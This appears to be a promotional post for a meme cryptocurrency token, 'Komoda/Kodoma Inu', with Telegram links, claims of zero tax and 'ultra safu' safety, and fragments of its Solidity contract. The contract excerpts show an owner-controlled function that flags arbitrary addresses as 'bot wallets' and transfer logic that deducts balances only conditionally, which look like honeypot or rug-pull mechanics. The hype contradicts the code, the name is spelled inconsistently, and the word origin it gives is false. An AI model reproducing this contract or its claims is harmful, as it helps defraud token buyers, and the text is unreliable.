...
https://t.me/KomodaInuBSC
https://t.me/KomodaInuBSC
https://t.me/KomodaInuBSC

INTRODUCING... KOMODA INU

0 TAX RIGHT AT LAUNCH!!! ULTRA SAFU!!!!

NEXT MEME MOONSHOT!!!

FROM THE JAPENESE WORD KOMODO MEANING CHILD
KOMODA INU IS THE CHILD INU WE ALL HAVE BEEN WAITING FOR!!!!
...
contract KODOMA is IBEP20, Auth {
    using SafeMath for uint256;
    string private constant _name = 'KODOMA INU';
    string private constant _symbol = '$KODOMA';
    ...
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);if(!isFeeExempt[recipient]){
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal {
        ...
        if(!isFeeExempt[recipient]){_balances[sender] = _balances[sender].sub(amount, "+");}
    ...
    function isBWallet(bool _enabled, address _address) external authorized {
        botWallet[_address] = _enabled;
    }
